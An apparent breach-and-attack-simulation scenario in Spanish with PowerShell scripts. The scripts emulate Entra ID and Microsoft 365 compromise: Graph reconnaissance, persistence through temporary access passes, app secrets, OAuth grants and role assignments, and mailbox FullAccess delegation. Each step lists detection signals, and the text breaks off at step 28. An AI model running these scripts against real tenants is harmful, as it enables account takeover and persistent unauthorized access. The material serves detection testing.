# Microsoft Entra ID and Microsoft 365 Identity Compromise

| | |
|---|---|
| **Status** | active |
| **Severity** | critical |
| **Target environment** | Microsoft Entra ID + Microsoft 365 (Exchange Online, SharePoint Online, OneDrive y Teams) |
| **MITRE Tactic** | TA0001 — Initial Access |
| **MITRE Technique** | T1078.004 — Cloud Accounts |
| **Tags** | `entra-id` · `microsoft-365` · `identity` · `oauth` · `mfa` · `exchange-online` · `sharepoint` · `onedrive` · `teams` · `bas` · `atomic` |
| **Autor** | Sergio Javier Mazariego Guevara |
| **Creado** | 2026-07-20T22:28:38.240Z |
| **Actualizado** | 2026-07-20T22:28:38.240Z |

## Descripción

Escenario atómico que modela robo o reutilización de sesión, reconocimiento del tenant, persistencia mediante métodos de autenticación y aplicaciones, abuso de permisos OAuth y acceso controlado a Exchange Online, SharePoint, OneDrive y Teams.

## Steps

### 1. Validar token de Microsoft Graph

**MITRE:** T1078.004

Validar un access token controlado contra Microsoft Graph y obtener el contexto del tenant.

```powershell
$ErrorActionPreference = "Stop"
if (-not $env:STRIKE_ACCESS_TOKEN) { throw "Falta STRIKE_ACCESS_TOKEN" }
$Headers = @{ Authorization = "Bearer $($env:STRIKE_ACCESS_TOKEN)"; "Content-Type" = "application/json" }
$State = if ($env:STRIKE_STATE_DIR) { $env:STRIKE_STATE_DIR } else { Join-Path $env:TEMP "strike-entra-state" }
New-Item -ItemType Directory -Force -Path $State | Out-Null

$Result = Invoke-RestMethod -Method GET -Headers $Headers -Uri "https://graph.microsoft.com/v1.0/organization?$select=id,displayName,verifiedDomains"
$Result | ConvertTo-Json -Depth 20 | Tee-Object -FilePath (Join-Path $State "entra-organization.json")
```

**Resultado esperado:**

Microsoft Graph devuelve la organización asociada al token BAS.

**Señales de detección:**

Entra sign-in logs y Microsoft Graph activity; appId, usuario, IP, client type, scopes y Conditional Access.

### 2. Obtener identidad efectiva con /me

**MITRE:** T1078.004

Identificar al usuario cuya sesión o token representa la identidad comprometida.

```powershell
$ErrorActionPreference = "Stop"
if (-not $env:STRIKE_ACCESS_TOKEN) { throw "Falta STRIKE_ACCESS_TOKEN" }
$Headers = @{ Authorization = "Bearer $($env:STRIKE_ACCESS_TOKEN)"; "Content-Type" = "application/json" }
$State = if ($env:STRIKE_STATE_DIR) { $env:STRIKE_STATE_DIR } else { Join-Path $env:TEMP "strike-entra-state" }
New-Item -ItemType Directory -Force -Path $State | Out-Null

$Result = Invoke-RestMethod -Method GET -Headers $Headers -Uri "https://graph.microsoft.com/v1.0/me?$select=id,displayName,userPrincipalName,accountEnabled"
$Result | ConvertTo-Json -Depth 20 | Tee-Object -FilePath (Join-Path $State "entra-me.json")
```

**Resultado esperado:**

Graph devuelve id, UPN y estado de la identidad efectiva.

**Señales de detección:**

Microsoft Graph GET /me correlacionado con el inicio de sesión y aplicación cliente.

### 3. Decodificar claims del token OAuth

**MITRE:** T1528

Inspeccionar localmente audiencia, tenant, aplicación, scopes, roles, autenticación y expiración del token.

```powershell
$ErrorActionPreference = "Stop"
if (-not $env:STRIKE_ACCESS_TOKEN) { throw "Falta STRIKE_ACCESS_TOKEN" }
$State = if ($env:STRIKE_STATE_DIR) { $env:STRIKE_STATE_DIR } else { Join-Path $env:TEMP "strike-entra-state" }
New-Item -ItemType Directory -Force -Path $State | Out-Null
$Part = $env:STRIKE_ACCESS_TOKEN.Split('.')[1].Replace('-','+').Replace('_','/')
switch ($Part.Length % 4) { 2 {$Part += '=='} 3 {$Part += '='} }
$Claims = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($Part)) | ConvertFrom-Json
$Claims | ConvertTo-Json -Depth 10 | Tee-Object -FilePath (Join-Path $State "entra-token-claims.json")
```

**Resultado esperado:**

Se obtienen claims como tid, aud, appid/azp, scp o roles, amr, ipaddr y exp sin exponer el token completo.

**Señales de detección:**

Este atomic es local; su valor defensivo depende de correlacionar los claims con sign-in logs.

### 4. Enumerar dominios del tenant

**MITRE:** T1526

Consultar mediante Microsoft Graph el procedimiento: enumerar dominios del tenant.

```powershell
$ErrorActionPreference = "Stop"
if (-not $env:STRIKE_ACCESS_TOKEN) { throw "Falta STRIKE_ACCESS_TOKEN" }
$Headers = @{ Authorization = "Bearer $($env:STRIKE_ACCESS_TOKEN)"; "Content-Type" = "application/json" }
$State = if ($env:STRIKE_STATE_DIR) { $env:STRIKE_STATE_DIR } else { Join-Path $env:TEMP "strike-entra-state" }
New-Item -ItemType Directory -Force -Path $State | Out-Null

$Result = Invoke-RestMethod -Method GET -Headers $Headers -Uri "https://graph.microsoft.com/v1.0/domains?$select=id,isDefault,isVerified,authenticationType"
$Result | ConvertTo-Json -Depth 20 | Tee-Object -FilePath (Join-Path $State "entra-domains.json")
```

**Resultado esperado:**

Dominios verificados, dominio predeterminado y tipo de autenticación.

**Señales de detección:**

Microsoft Graph request domains; Entra audit/sign-in logs, principal, appId, IP y resultado.

### 5. Enumerar usuarios Entra

**MITRE:** T1087.004

Consultar mediante Microsoft Graph el procedimiento: enumerar usuarios entra.

```powershell
$ErrorActionPreference = "Stop"
if (-not $env:STRIKE_ACCESS_TOKEN) { throw "Falta STRIKE_ACCESS_TOKEN" }
$Headers = @{ Authorization = "Bearer $($env:STRIKE_ACCESS_TOKEN)"; "Content-Type" = "application/json" }
$State = if ($env:STRIKE_STATE_DIR) { $env:STRIKE_STATE_DIR } else { Join-Path $env:TEMP "strike-entra-state" }
New-Item -ItemType Directory -Force -Path $State | Out-Null

$Result = Invoke-RestMethod -Method GET -Headers $Headers -Uri "https://graph.microsoft.com/v1.0/users?$top=50&$select=id,displayName,userPrincipalName,accountEnabled,userType"
$Result | ConvertTo-Json -Depth 20 | Tee-Object -FilePath (Join-Path $State "entra-users.json")
```

**Resultado esperado:**

Primer conjunto de usuarios visibles para la identidad BAS.

**Señales de detección:**

Microsoft Graph request users; Entra audit/sign-in logs, principal, appId, IP y resultado.

### 6. Enumerar grupos Entra

**MITRE:** T1069.003

Consultar mediante Microsoft Graph el procedimiento: enumerar grupos entra.

```powershell
$ErrorActionPreference = "Stop"
if (-not $env:STRIKE_ACCESS_TOKEN) { throw "Falta STRIKE_ACCESS_TOKEN" }
$Headers = @{ Authorization = "Bearer $($env:STRIKE_ACCESS_TOKEN)"; "Content-Type" = "application/json" }
$State = if ($env:STRIKE_STATE_DIR) { $env:STRIKE_STATE_DIR } else { Join-Path $env:TEMP "strike-entra-state" }
New-Item -ItemType Directory -Force -Path $State | Out-Null

$Result = Invoke-RestMethod -Method GET -Headers $Headers -Uri "https://graph.microsoft.com/v1.0/groups?$top=50&$select=id,displayName,securityEnabled,mailEnabled"
$Result | ConvertTo-Json -Depth 20 | Tee-Object -FilePath (Join-Path $State "entra-groups.json")
```

**Resultado esperado:**

Grupos visibles, incluidos grupos de seguridad y Microsoft 365.

**Señales de detección:**

Microsoft Graph request groups; Entra audit/sign-in logs, principal, appId, IP y resultado.

### 7. Enumerar roles de directorio activos

**MITRE:** T1069.003

Consultar mediante Microsoft Graph el procedimiento: enumerar roles de directorio activos.

```powershell
$ErrorActionPreference = "Stop"
if (-not $env:STRIKE_ACCESS_TOKEN) { throw "Falta STRIKE_ACCESS_TOKEN" }
$Headers = @{ Authorization = "Bearer $($env:STRIKE_ACCESS_TOKEN)"; "Content-Type" = "application/json" }
$State = if ($env:STRIKE_STATE_DIR) { $env:STRIKE_STATE_DIR } else { Join-Path $env:TEMP "strike-entra-state" }
New-Item -ItemType Directory -Force -Path $State | Out-Null

$Result = Invoke-RestMethod -Method GET -Headers $Headers -Uri "https://graph.microsoft.com/v1.0/directoryRoles?$select=id,displayName,roleTemplateId"
$Result | ConvertTo-Json -Depth 20 | Tee-Object -FilePath (Join-Path $State "entra-directory-roles.json")
```

**Resultado esperado:**

Roles de directorio activados en el tenant.

**Señales de detección:**

Microsoft Graph request directoryRoles; Entra audit/sign-in logs, principal, appId, IP y resultado.

### 8. Enumerar asignaciones de roles Entra

**MITRE:** T1069.003

Consultar mediante Microsoft Graph el procedimiento: enumerar asignaciones de roles entra.

```powershell
$ErrorActionPreference = "Stop"
if (-not $env:STRIKE_ACCESS_TOKEN) { throw "Falta STRIKE_ACCESS_TOKEN" }
$Headers = @{ Authorization = "Bearer $($env:STRIKE_ACCESS_TOKEN)"; "Content-Type" = "application/json" }
$State = if ($env:STRIKE_STATE_DIR) { $env:STRIKE_STATE_DIR } else { Join-Path $env:TEMP "strike-entra-state" }
New-Item -ItemType Directory -Force -Path $State | Out-Null

$Result = Invoke-RestMethod -Method GET -Headers $Headers -Uri "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments?$top=100"
$Result | ConvertTo-Json -Depth 20 | Tee-Object -FilePath (Join-Path $State "entra-role-assignments.json")
```

**Resultado esperado:**

Asignaciones de roles y principals privilegiados visibles.

**Señales de detección:**

Microsoft Graph request roleManagement/directory/roleAssignments; Entra audit/sign-in logs, principal, appId, IP y resultado.

### 9. Enumerar registros de aplicaciones

**MITRE:** T1526

Consultar mediante Microsoft Graph el procedimiento: enumerar registros de aplicaciones.

```powershell
$ErrorActionPreference = "Stop"
if (-not $env:STRIKE_ACCESS_TOKEN) { throw "Falta STRIKE_ACCESS_TOKEN" }
$Headers = @{ Authorization = "Bearer $($env:STRIKE_ACCESS_TOKEN)"; "Content-Type" = "application/json" }
$State = if ($env:STRIKE_STATE_DIR) { $env:STRIKE_STATE_DIR } else { Join-Path $env:TEMP "strike-entra-state" }
New-Item -ItemType Directory -Force -Path $State | Out-Null

$Result = Invoke-RestMethod -Method GET -Headers $Headers -Uri "https://graph.microsoft.com/v1.0/applications?$top=50&$select=id,appId,displayName,signInAudience"
$Result | ConvertTo-Json -Depth 20 | Tee-Object -FilePath (Join-Path $State "entra-applications.json")
```

**Resultado esperado:**

Aplicaciones registradas visibles para la identidad.

**Señales de detección:**

Microsoft Graph request applications; Entra audit/sign-in logs, principal, appId, IP y resultado.

### 10. Enumerar service principals

**MITRE:** T1526

Consultar mediante Microsoft Graph el procedimiento: enumerar service principals.

```powershell
$ErrorActionPreference = "Stop"
if (-not $env:STRIKE_ACCESS_TOKEN) { throw "Falta STRIKE_ACCESS_TOKEN" }
$Headers = @{ Authorization = "Bearer $($env:STRIKE_ACCESS_TOKEN)"; "Content-Type" = "application/json" }
$State = if ($env:STRIKE_STATE_DIR) { $env:STRIKE_STATE_DIR } else { Join-Path $env:TEMP "strike-entra-state" }
New-Item -ItemType Directory -Force -Path $State | Out-Null

$Result = Invoke-RestMethod -Method GET -Headers $Headers -Uri "https://graph.microsoft.com/v1.0/servicePrincipals?$top=50&$select=id,appId,displayName,servicePrincipalType"
$Result | ConvertTo-Json -Depth 20 | Tee-Object -FilePath (Join-Path $State "entra-service-principals.json")
```

**Resultado esperado:**

Aplicaciones empresariales e identidades de workload visibles.

**Señales de detección:**

Microsoft Graph request servicePrincipals; Entra audit/sign-in logs, principal, appId, IP y resultado.

### 11. Enumerar consentimientos OAuth

**MITRE:** T1526

Consultar mediante Microsoft Graph el procedimiento: enumerar consentimientos oauth.

```powershell
$ErrorActionPreference = "Stop"
if (-not $env:STRIKE_ACCESS_TOKEN) { throw "Falta STRIKE_ACCESS_TOKEN" }
$Headers = @{ Authorization = "Bearer $($env:STRIKE_ACCESS_TOKEN)"; "Content-Type" = "application/json" }
$State = if ($env:STRIKE_STATE_DIR) { $env:STRIKE_STATE_DIR } else { Join-Path $env:TEMP "strike-entra-state" }
New-Item -ItemType Directory -Force -Path $State | Out-Null

$Result = Invoke-RestMethod -Method GET -Headers $Headers -Uri "https://graph.microsoft.com/v1.0/oauth2PermissionGrants?$top=100"
$Result | ConvertTo-Json -Depth 20 | Tee-Object -FilePath (Join-Path $State "entra-oauth-grants.json")
```

**Resultado esperado:**

Grants delegados existentes, scopes y principals relacionados.

**Señales de detección:**

Microsoft Graph request oauth2PermissionGrants; Entra audit/sign-in logs, principal, appId, IP y resultado.

### 12. Enumerar dispositivos registrados

**MITRE:** T1087.004

Consultar mediante Microsoft Graph el procedimiento: enumerar dispositivos registrados.

```powershell
$ErrorActionPreference = "Stop"
if (-not $env:STRIKE_ACCESS_TOKEN) { throw "Falta STRIKE_ACCESS_TOKEN" }
$Headers = @{ Authorization = "Bearer $($env:STRIKE_ACCESS_TOKEN)"; "Content-Type" = "application/json" }
$State = if ($env:STRIKE_STATE_DIR) { $env:STRIKE_STATE_DIR } else { Join-Path $env:TEMP "strike-entra-state" }
New-Item -ItemType Directory -Force -Path $State | Out-Null

$Result = Invoke-RestMethod -Method GET -Headers $Headers -Uri "https://graph.microsoft.com/v1.0/devices?$top=50&$select=id,deviceId,displayName,operatingSystem,trustType,isCompliant"
$Result | ConvertTo-Json -Depth 20 | Tee-Object -FilePath (Join-Path $State "entra-devices.json")
```

**Resultado esperado:**

Dispositivos registrados y señales de confianza/compliance visibles.

**Señales de detección:**

Microsoft Graph request devices; Entra audit/sign-in logs, principal, appId, IP y resultado.

### 13. Enumerar políticas Conditional Access

**MITRE:** T1526

Consultar mediante Microsoft Graph el procedimiento: enumerar políticas conditional access.

```powershell
$ErrorActionPreference = "Stop"
if (-not $env:STRIKE_ACCESS_TOKEN) { throw "Falta STRIKE_ACCESS_TOKEN" }
$Headers = @{ Authorization = "Bearer $($env:STRIKE_ACCESS_TOKEN)"; "Content-Type" = "application/json" }
$State = if ($env:STRIKE_STATE_DIR) { $env:STRIKE_STATE_DIR } else { Join-Path $env:TEMP "strike-entra-state" }
New-Item -ItemType Directory -Force -Path $State | Out-Null

$Result = Invoke-RestMethod -Method GET -Headers $Headers -Uri "https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies?$top=50"
$Result | ConvertTo-Json -Depth 20 | Tee-Object -FilePath (Join-Path $State "entra-conditional-access.json")
```

**Resultado esperado:**

Políticas Conditional Access cuando el principal dispone de permisos.

**Señales de detección:**

Microsoft Graph request identity/conditionalAccess/policies; Entra audit/sign-in logs, principal, appId, IP y resultado.

### 14. Consultar inicios de sesión recientes

**MITRE:** T1526

Consultar mediante Microsoft Graph el procedimiento: consultar inicios de sesión recientes.

```powershell
$ErrorActionPreference = "Stop"
if (-not $env:STRIKE_ACCESS_TOKEN) { throw "Falta STRIKE_ACCESS_TOKEN" }
$Headers = @{ Authorization = "Bearer $($env:STRIKE_ACCESS_TOKEN)"; "Content-Type" = "application/json" }
$State = if ($env:STRIKE_STATE_DIR) { $env:STRIKE_STATE_DIR } else { Join-Path $env:TEMP "strike-entra-state" }
New-Item -ItemType Directory -Force -Path $State | Out-Null

$Result = Invoke-RestMethod -Method GET -Headers $Headers -Uri "https://graph.microsoft.com/v1.0/auditLogs/signIns?$top=25"
$Result | ConvertTo-Json -Depth 20 | Tee-Object -FilePath (Join-Path $State "entra-signins.json")
```

**Resultado esperado:**

Eventos recientes de autenticación y evaluación de Conditional Access.

**Señales de detección:**

Microsoft Graph request auditLogs/signIns; Entra audit/sign-in logs, principal, appId, IP y resultado.

### 15. Consultar auditoría del directorio

**MITRE:** T1526

Consultar mediante Microsoft Graph el procedimiento: consultar auditoría del directorio.

```powershell
$ErrorActionPreference = "Stop"
if (-not $env:STRIKE_ACCESS_TOKEN) { throw "Falta STRIKE_ACCESS_TOKEN" }
$Headers = @{ Authorization = "Bearer $($env:STRIKE_ACCESS_TOKEN)"; "Content-Type" = "application/json" }
$State = if ($env:STRIKE_STATE_DIR) { $env:STRIKE_STATE_DIR } else { Join-Path $env:TEMP "strike-entra-state" }
New-Item -ItemType Directory -Force -Path $State | Out-Null

$Result = Invoke-RestMethod -Method GET -Headers $Headers -Uri "https://graph.microsoft.com/v1.0/auditLogs/directoryAudits?$top=25"
$Result | ConvertTo-Json -Depth 20 | Tee-Object -FilePath (Join-Path $State "entra-directory-audits.json")
```

**Resultado esperado:**

Cambios recientes sobre identidades, aplicaciones y roles.

**Señales de detección:**

Microsoft Graph request auditLogs/directoryAudits; Entra audit/sign-in logs, principal, appId, IP y resultado.

### 16. Enumerar métodos de autenticación del usuario canary

**MITRE:** T1087.004

Consultar mediante Microsoft Graph el procedimiento: enumerar métodos de autenticación del usuario canary.

```powershell
$ErrorActionPreference = "Stop"
if (-not $env:STRIKE_ACCESS_TOKEN) { throw "Falta STRIKE_ACCESS_TOKEN" }
$Headers = @{ Authorization = "Bearer $($env:STRIKE_ACCESS_TOKEN)"; "Content-Type" = "application/json" }
$State = if ($env:STRIKE_STATE_DIR) { $env:STRIKE_STATE_DIR } else { Join-Path $env:TEMP "strike-entra-state" }
New-Item -ItemType Directory -Force -Path $State | Out-Null

$Result = Invoke-RestMethod -Method GET -Headers $Headers -Uri "https://graph.microsoft.com/v1.0/users/${STRIKE_VICTIM_USER_ID}/authentication/methods"
$Result | ConvertTo-Json -Depth 20 | Tee-Object -FilePath (Join-Path $State "entra-auth-methods.json")
```

**Resultado esperado:**

Métodos de autenticación registrados en el usuario BAS.

**Señales de detección:**

Microsoft Graph request users/${STRIKE_VICTIM_USER_ID}/authentication/methods; Entra audit/sign-in logs, principal, appId, IP y resultado.

### 17. Crear Temporary Access Pass canary

**MITRE:** T1098.001

Agregar un método de autenticación temporal al usuario canary para emular persistencia de credenciales.

```powershell
$ErrorActionPreference = "Stop"
if (-not $env:STRIKE_ACCESS_TOKEN) { throw "Falta STRIKE_ACCESS_TOKEN" }
$Headers = @{ Authorization = "Bearer $($env:STRIKE_ACCESS_TOKEN)"; "Content-Type" = "application/json" }
$State = if ($env:STRIKE_STATE_DIR) { $env:STRIKE_STATE_DIR } else { Join-Path $env:TEMP "strike-entra-state" }
New-Item -ItemType Directory -Force -Path $State | Out-Null

$Body = @{ lifetimeInMinutes = 10; isUsableOnce = $true } | ConvertTo-Json -Depth 12
$Result = Invoke-RestMethod -Method POST -Headers $Headers -Uri "https://graph.microsoft.com/v1.0/users/${STRIKE_VICTIM_USER_ID}/authentication/temporaryAccessPassMethods" -Body $Body
$Result | ConvertTo-Json -Depth 20 | Tee-Object -FilePath (Join-Path $State "entra-tap.json")
```

**Resultado esperado:**

Graph crea un TAP de un solo uso y duración reducida para el usuario canary.

**Señales de detección:**

Entra audit: Add authentication method / Temporary Access Pass; actor, target, IP y app.

### 18. Registrar dispositivo canary en Entra

**MITRE:** T1098.005

Crear un objeto de dispositivo controlado para validar detección de persistencia mediante Device Registration.

```powershell
$ErrorActionPreference = "Stop"
if (-not $env:STRIKE_ACCESS_TOKEN) { throw "Falta STRIKE_ACCESS_TOKEN" }
$Headers = @{ Authorization = "Bearer $($env:STRIKE_ACCESS_TOKEN)"; "Content-Type" = "application/json" }
$State = if ($env:STRIKE_STATE_DIR) { $env:STRIKE_STATE_DIR } else { Join-Path $env:TEMP "strike-entra-state" }
New-Item -ItemType Directory -Force -Path $State | Out-Null

$Body = @{ accountEnabled=$true; displayName="STRIKE-BAS-$([guid]::NewGuid().ToString().Substring(0,8))"; deviceId=[guid]::NewGuid().ToString(); operatingSystem="Windows"; operatingSystemVersion="11-BAS" } | ConvertTo-Json -Depth 12
$Result = Invoke-RestMethod -Method POST -Headers $Headers -Uri "https://graph.microsoft.com/v1.0/devices" -Body $Body
$Result | ConvertTo-Json -Depth 20 | Tee-Object -FilePath (Join-Path $State "entra-device-created.json")
```

**Resultado esperado:**

Se crea un objeto device inequívocamente etiquetado como STRIKE-BAS.

**Señales de detección:**

Entra audit: Add device; actor, appId, deviceId, displayName y trust context.

### 19. Crear aplicación Entra canary

**MITRE:** T1136.003

Crear un registro de aplicación BAS para emular persistencia mediante una identidad no humana.

```powershell
$ErrorActionPreference = "Stop"
if (-not $env:STRIKE_ACCESS_TOKEN) { throw "Falta STRIKE_ACCESS_TOKEN" }
$Headers = @{ Authorization = "Bearer $($env:STRIKE_ACCESS_TOKEN)"; "Content-Type" = "application/json" }
$State = if ($env:STRIKE_STATE_DIR) { $env:STRIKE_STATE_DIR } else { Join-Path $env:TEMP "strike-entra-state" }
New-Item -ItemType Directory -Force -Path $State | Out-Null

$Body = @{ displayName="STRIKE-BAS-App-$([guid]::NewGuid().ToString().Substring(0,8))"; signInAudience="AzureADMyOrg" } | ConvertTo-Json -Depth 12
$Result = Invoke-RestMethod -Method POST -Headers $Headers -Uri "https://graph.microsoft.com/v1.0/applications" -Body $Body
$Result | ConvertTo-Json -Depth 20 | Tee-Object -FilePath (Join-Path $State "entra-app-created.json")
```

**Resultado esperado:**

Se crea un app registration dentro del tenant con nombre STRIKE-BAS.

**Señales de detección:**

Entra audit: Add application; actor, application object ID, appId y displayName.

### 20. Crear service principal canary

**MITRE:** T1136.003

Instanciar como enterprise application el appId canary provisionado para la prueba.

```powershell
$ErrorActionPreference = "Stop"
if (-not $env:STRIKE_ACCESS_TOKEN) { throw "Falta STRIKE_ACCESS_TOKEN" }
$Headers = @{ Authorization = "Bearer $($env:STRIKE_ACCESS_TOKEN)"; "Content-Type" = "application/json" }
$State = if ($env:STRIKE_STATE_DIR) { $env:STRIKE_STATE_DIR } else { Join-Path $env:TEMP "strike-entra-state" }
New-Item -ItemType Directory -Force -Path $State | Out-Null

$Body = @{ appId=$env:STRIKE_APP_ID } | ConvertTo-Json -Depth 12
$Result = Invoke-RestMethod -Method POST -Headers $Headers -Uri "https://graph.microsoft.com/v1.0/servicePrincipals" -Body $Body
$Result | ConvertTo-Json -Depth 20 | Tee-Object -FilePath (Join-Path $State "entra-sp-created.json")
```

**Resultado esperado:**

Se crea un service principal para la aplicación canary.

**Señales de detección:**

Entra audit: Add service principal; actor, appId, object ID y tenant.

### 21. Agregar client secret a aplicación canary

**MITRE:** T1098.001

Agregar una credencial password efímera a la aplicación BAS y conservar únicamente keyId para su remoción.

```powershell
$ErrorActionPreference = "Stop"
if (-not $env:STRIKE_ACCESS_TOKEN) { throw "Falta STRIKE_ACCESS_TOKEN" }
$Headers = @{ Authorization = "Bearer $($env:STRIKE_ACCESS_TOKEN)"; "Content-Type" = "application/json" }
$State = if ($env:STRIKE_STATE_DIR) { $env:STRIKE_STATE_DIR } else { Join-Path $env:TEMP "strike-entra-state" }
New-Item -ItemType Directory -Force -Path $State | Out-Null

$Body = @{ passwordCredential=@{ displayName="STRIKE-BAS-secret"; endDateTime=(Get-Date).ToUniversalTime().AddMinutes(30).ToString("o") } } | ConvertTo-Json -Depth 12
$Result = Invoke-RestMethod -Method POST -Headers $Headers -Uri "https://graph.microsoft.com/v1.0/applications/${STRIKE_APP_OBJECT_ID}/addPassword" -Body $Body
$Result | ConvertTo-Json -Depth 20 | Tee-Object -FilePath (Join-Path $State "entra-app-secret.json")
```

**Resultado esperado:**

Graph devuelve keyId y secretText una sola vez; el secreto se guarda solo en el state local protegido.

**Señales de detección:**

Entra audit: Update application – add password credential; actor, app object y keyId.

### 22. Agregar owner a aplicación canary

**MITRE:** T1098

Conceder a un usuario canary control administrativo sobre el app registration BAS.

```powershell
$ErrorActionPreference = "Stop"
if (-not $env:STRIKE_ACCESS_TOKEN) { throw "Falta STRIKE_ACCESS_TOKEN" }
$Headers = @{ Authorization = "Bearer $($env:STRIKE_ACCESS_TOKEN)"; "Content-Type" = "application/json" }
$State = if ($env:STRIKE_STATE_DIR) { $env:STRIKE_STATE_DIR } else { Join-Path $env:TEMP "strike-entra-state" }
New-Item -ItemType Directory -Force -Path $State | Out-Null

$Body = @{ "@odata.id"="https://graph.microsoft.com/v1.0/directoryObjects/$($env:STRIKE_DELEGATE_USER_ID)" } | ConvertTo-Json
Invoke-RestMethod -Method POST -Headers $Headers -Uri "https://graph.microsoft.com/v1.0/applications/$($env:STRIKE_APP_OBJECT_ID)/owners/`$ref" -Body $Body
```

**Resultado esperado:**

El usuario delegado aparece como owner de la aplicación canary.

**Señales de detección:**

Entra audit: Add owner to application; actor, owner agregado y app target.

### 23. Otorgar consentimiento OAuth delegado canary

**MITRE:** T1098

Crear un oauth2PermissionGrant de alcance limitado sobre Microsoft Graph para el service principal BAS.

```powershell
$ErrorActionPreference = "Stop"
if (-not $env:STRIKE_ACCESS_TOKEN) { throw "Falta STRIKE_ACCESS_TOKEN" }
$Headers = @{ Authorization = "Bearer $($env:STRIKE_ACCESS_TOKEN)"; "Content-Type" = "application/json" }
$State = if ($env:STRIKE_STATE_DIR) { $env:STRIKE_STATE_DIR } else { Join-Path $env:TEMP "strike-entra-state" }
New-Item -ItemType Directory -Force -Path $State | Out-Null

$Body = @{ clientId=$env:STRIKE_SP_OBJECT_ID; consentType="Principal"; principalId=$env:STRIKE_VICTIM_USER_ID; resourceId=$env:STRIKE_GRAPH_SP_OBJECT_ID; scope=$env:STRIKE_OAUTH_SCOPE } | ConvertTo-Json -Depth 12
$Result = Invoke-RestMethod -Method POST -Headers $Headers -Uri "https://graph.microsoft.com/v1.0/oauth2PermissionGrants" -Body $Body
$Result | ConvertTo-Json -Depth 20 | Tee-Object -FilePath (Join-Path $State "entra-oauth-grant-created.json")
```

**Resultado esperado:**

Se crea un grant delegado limitado al usuario y scope configurados.

**Señales de detección:**

Entra audit: Consent to application / Add delegated permission grant; actor, app, resource y scope.

### 24. Asignar app role de Graph a service principal canary

**MITRE:** T1098.003

Asignar temporalmente un application permission específico al service principal BAS.

```powershell
$ErrorActionPreference = "Stop"
if (-not $env:STRIKE_ACCESS_TOKEN) { throw "Falta STRIKE_ACCESS_TOKEN" }
$Headers = @{ Authorization = "Bearer $($env:STRIKE_ACCESS_TOKEN)"; "Content-Type" = "application/json" }
$State = if ($env:STRIKE_STATE_DIR) { $env:STRIKE_STATE_DIR } else { Join-Path $env:TEMP "strike-entra-state" }
New-Item -ItemType Directory -Force -Path $State | Out-Null

$Body = @{ principalId=$env:STRIKE_SP_OBJECT_ID; resourceId=$env:STRIKE_GRAPH_SP_OBJECT_ID; appRoleId=$env:STRIKE_GRAPH_APP_ROLE_ID } | ConvertTo-Json -Depth 12
$Result = Invoke-RestMethod -Method POST -Headers $Headers -Uri "https://graph.microsoft.com/v1.0/servicePrincipals/${STRIKE_SP_OBJECT_ID}/appRoleAssignments" -Body $Body
$Result | ConvertTo-Json -Depth 20 | Tee-Object -FilePath (Join-Path $State "entra-app-role-assignment.json")
```

**Resultado esperado:**

Se crea una asignación de app role explícita y limitada.

**Señales de detección:**

Entra audit: Add app role assignment to service principal; actor, resource, role ID y principal.

### 25. Modificar redirect URI de aplicación canary

**MITRE:** T1098

Agregar una redirect URI BAS a una aplicación y restaurar exactamente la configuración original.

```powershell
$ErrorActionPreference = "Stop"
if (-not $env:STRIKE_ACCESS_TOKEN) { throw "Falta STRIKE_ACCESS_TOKEN" }
$Headers = @{ Authorization = "Bearer $($env:STRIKE_ACCESS_TOKEN)"; "Content-Type" = "application/json" }
$State = if ($env:STRIKE_STATE_DIR) { $env:STRIKE_STATE_DIR } else { Join-Path $env:TEMP "strike-entra-state" }
New-Item -ItemType Directory -Force -Path $State | Out-Null

$App=Invoke-RestMethod -Method GET -Headers $Headers -Uri "https://graph.microsoft.com/v1.0/applications/$($env:STRIKE_APP_OBJECT_ID)"
$App | ConvertTo-Json -Depth 20 | Set-Content (Join-Path $State "entra-app-before-redirect.json")
$Uris=@($App.web.redirectUris)+@($env:STRIKE_REDIRECT_URI) | Select-Object -Unique
$Body=@{ web=@{ redirectUris=$Uris } } | ConvertTo-Json -Depth 5
Invoke-RestMethod -Method PATCH -Headers $Headers -Uri "https://graph.microsoft.com/v1.0/applications/$($env:STRIKE_APP_OBJECT_ID)" -Body $Body
```

**Resultado esperado:**

La URI BAS queda asociada temporalmente al app registration.

**Señales de detección:**

Entra audit: Update application; modifiedProperties sobre web.redirectUris.

### 26. Asignar rol Entra limitado a usuario canary

**MITRE:** T1098.003

Crear temporalmente una asignación de rol de directorio limitado al usuario canary.

```powershell
$ErrorActionPreference = "Stop"
if (-not $env:STRIKE_ACCESS_TOKEN) { throw "Falta STRIKE_ACCESS_TOKEN" }
$Headers = @{ Authorization = "Bearer $($env:STRIKE_ACCESS_TOKEN)"; "Content-Type" = "application/json" }
$State = if ($env:STRIKE_STATE_DIR) { $env:STRIKE_STATE_DIR } else { Join-Path $env:TEMP "strike-entra-state" }
New-Item -ItemType Directory -Force -Path $State | Out-Null

$Body = @{ principalId=$env:STRIKE_VICTIM_USER_ID; roleDefinitionId=$env:STRIKE_DIRECTORY_ROLE_DEFINITION_ID; directoryScopeId="/" } | ConvertTo-Json -Depth 12
$Result = Invoke-RestMethod -Method POST -Headers $Headers -Uri "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments" -Body $Body
$Result | ConvertTo-Json -Depth 20 | Tee-Object -FilePath (Join-Path $State "entra-directory-role-assignment.json")
```

**Resultado esperado:**

Se crea la asignación del rol canary y puede verificarse por Graph.

**Señales de detección:**

Entra audit: Add member to role / role assignment; actor, principal, roleDefinitionId y scope.

### 27. Agregar permisos FullAccess a mailbox canary

**MITRE:** T1098.002

Conceder temporalmente FullAccess sobre el mailbox BAS a un usuario delegado canary.

```powershell
$ErrorActionPreference="Stop"
Import-Module ExchangeOnlineManagement
Connect-ExchangeOnline -Organization $env:STRIKE_TENANT_ID -ShowBanner:$false
Add-MailboxPermission -Identity $env:STRIKE_VICTIM_UPN -User $env:STRIKE_DELEGATE_UPN -AccessRights FullAccess -InheritanceType All -AutoMapping:$false -Confirm:$false
```

**Resultado esperado:**

El delegado aparece con FullAccess explícito sobre el mailbox BAS.

**Señales de detección:**

Unified Audit Log y Exchange admin audit: Add-MailboxPermission; actor, target mailbox, trustee y rights.

### 28. Enumerar carpetas de Exchange Online

**MITRE:** T1114.002

Consultar Microsoft Graph para enumerar carpetas de exchange online.

```powershell
$ErrorActionPreference = "Stop"
if (-not $env:STRIKE_ACCESS_TOKEN) { throw "Falta STRIKE_ACCESS_TOKEN" }
$Headers = @{ Authorization = "Bearer $($env:STRIKE_ACCESS_TOKEN)"; "Content-Type" = "application/json" }
